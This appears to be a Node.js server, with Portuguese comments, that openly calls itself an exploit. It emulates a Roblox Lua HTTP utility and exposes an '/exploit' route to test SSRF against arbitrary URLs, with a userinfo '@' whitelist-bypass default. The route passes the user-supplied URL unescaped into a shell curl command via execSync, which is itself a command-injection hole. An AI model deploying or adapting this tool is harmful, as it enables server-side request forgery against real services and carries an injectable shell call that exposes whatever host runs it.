// language: JavaScript, target: Node.js (Render Web Service)
// @author: Ratman4080

const express = require('express');
const { execSync } = require('child_process');
const { lua, lauxlib, lualib, to_luastring, to_jsstring } = require('fengari');

const app = express();
const PORT = process.env.PORT || 10000;

// ============================================================================
// CÓDIGO LUA (APIUtil)
// ============================================================================
const luaSource = `
local HttpRbxApiService = game:GetService("HttpRbxApiService")
local ContentProvider = game:GetService("ContentProvider")
local t1 = {}

function t1.getBaseDomain()
    local BaseUrl = ContentProvider.BaseUrl
    if string.sub(BaseUrl, #BaseUrl) ~= "/" then BaseUrl = BaseUrl .. "/" end
    local _, v2 = string.find(BaseUrl, "://")
    local _, v3 = string.find(BaseUrl, "%.", v2 + 1)
    return string.sub(BaseUrl, v3 + 1)
end

local function requestAndRetry(p1, p2)
    local v5 = 0
    if p2 ~= nil then v5 = p2 end
    local ok, result = pcall(p1)
    if ok then return true, result end
    if v5 >= 2 then return false, result end
    wait(2 ^ (v5 - 1))
    return requestAndRetry(p1, v5 + 1)
end

function t1.requestAndRetryGet(p5)
    return requestAndRetry(function()
        return HttpRbxApiService:GetAsyncFullUrl(p5)
    end)
end
return t1
`;

// ============================================================================
// ENGINE HTTP (CURL para ser SÍNCRONO)
// ============================================================================
function syncHttpRequest(url) {
    try {
        // O Render geralmente tem o curl instalado. O -s esconde o progresso.
        const cmd = `curl -s -i -L --max-time 8 -H "User-Agent: Roblox/WinInet" "${url}"`;
        return execSync(cmd, { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'ignore'] });
    } catch (e) {
        return `ERROR: ${e.message}`;
    }
}

// ============================================================================
// ROTA DO EXPLOIT
// ============================================================================
app.get('/exploit', (req, res) => {
    const targetUrl = req.query.url || 'https://users.roblox.com@httpbin.org/status/200';
    
    // Iniciando o Fengari (Lua)
    const L = lauxlib.luaL_newstate();
    lualib.luaL_openlibs(L);

    // Injetando o ambiente do Roblox no Lua
    lua.lua_register(L, 'get_service', (state) => {
        const serviceName = lua.lua_tostring(state, 1);
        lua.lua_newtable(state);
        if (to_jsstring(serviceName) === 'HttpRbxApiService') {
            lua.lua_pushcfunction(state, (s) => {
                const urlInLua = lua.lua_tostring(s, 1);
                const response = syncHttpRequest(to_jsstring(urlInLua));
                lua.lua_pushstring(s, to_luastring(response));
                return 1;
            });
            lua.lua_setfield(state, -2, to_luastring('GetAsyncFullUrl'));
        }
        if (to_jsstring(serviceName) === 'ContentProvider') {
            lua.lua_pushstring(state, to_luastring('https://www.roblox.com/'));
            lua.lua_setfield(state, -2, to_luastring('BaseUrl'));
        }
        return 1;
    });

    lua.lua_newtable(L);
    lua.lua_pushcfunction(L, (state) => {
        const service = lua.lua_tostring(state, 1);
        lua.lua_getglobal(state, to_luastring('get_service'));
        lua.lua_pushstring(state, service);
        lua.lua_call(state, 1, 1);
        return 1;
    });
    lua.lua_setfield(L, -2, to_luastring('GetService'));
    lua.lua_setglobal(L, to_luastring('game'));

    lua.lua_register(L, 'wait', (state) => {
        lua.lua_pushboolean(state, 1);
        return 1;
    });

    // Carregando e rodando o Lua
    const loadResult = lauxlib.luaL_loadstring(L, to_luastring(luaSource));
    if (loadResult !== lua.LUA_OK) {
        return res.status(500).json({ error: "Erro ao compilar Lua" });
    }

    lua.lua_pcall(L, 0, 1, 0);

    // Puxando a função
    lua.lua_getfield(L, -1, to_luastring('requestAndRetryGet'));
    if (lua.lua_isfunction(L, -1)) {
        lua.lua_pushstring(L, to_luastring(targetUrl));
        const callStatus = lua.lua_pcall(L, 1, 2, 0);
        
        if (callStatus === lua.LUA_OK) {
            const success = lua.lua_toboolean(L, -2);
            const result = lua.lua_tostring(L, -1);
            
            return res.json({
                status: "success",
                bypass_used: targetUrl.includes('@') ? "Userinfo (@) Bypass" : "Direct",
                success: success === 1,
                response_snippet: to_jsstring(result).substring(0, 300)
            });
        }
    }

    res.status(500).json({ error: "Erro na execução do Lua SSRF" });
});

app.get('/', (req, res) => {
    res.send("Executor rodando. Acesse /exploit?url=SUA_URL_AQUI para atacar.");
});

app.listen(PORT, () => {
    console.log(`[SERVER] Rodando na porta ${PORT}`);
});
